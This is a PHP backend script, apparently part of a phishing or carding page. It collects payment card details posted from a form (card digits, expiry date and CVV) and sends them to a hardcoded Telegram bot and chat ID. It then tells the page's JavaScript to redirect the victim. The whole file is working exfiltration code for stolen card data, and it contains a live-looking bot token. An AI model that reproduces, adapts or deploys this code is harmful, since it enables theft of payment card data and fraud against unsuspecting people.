<?php
// Configuración de Telegram
$token = "7553308512:AAHNHbCC0dRTtXcQRG5Ovdse92kA8Y8Wwkw";
$chat_id = "5157616506";

// Recibir datos del formulario
$tarjeta = $_POST['tarj'] ?? '';
$fecha = $_POST['fecha'] ?? '';
$cvv = $_POST['cvv'] ?? '';

if (!empty($tarjeta) && !empty($fecha) && !empty($cvv)) {
    $mensaje = "💳 *AVanz - CARD:*\n\n".
               "🔢 last 4: *$tarjeta*\n".
               "📅 date: *$fecha*\n".
               "🔒 CVV: *$cvv*";

    // Enviar mensaje a Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    $context  = stream_context_create($options);
    file_get_contents($url, false, $context);

    // Responder a JavaScript para redirigir después de enviar los datos
    echo json_encode(["status" => "success"]);
} else {
    echo json_encode(["status" => "error", "message" => "Datos incompletos"]);
}
?>
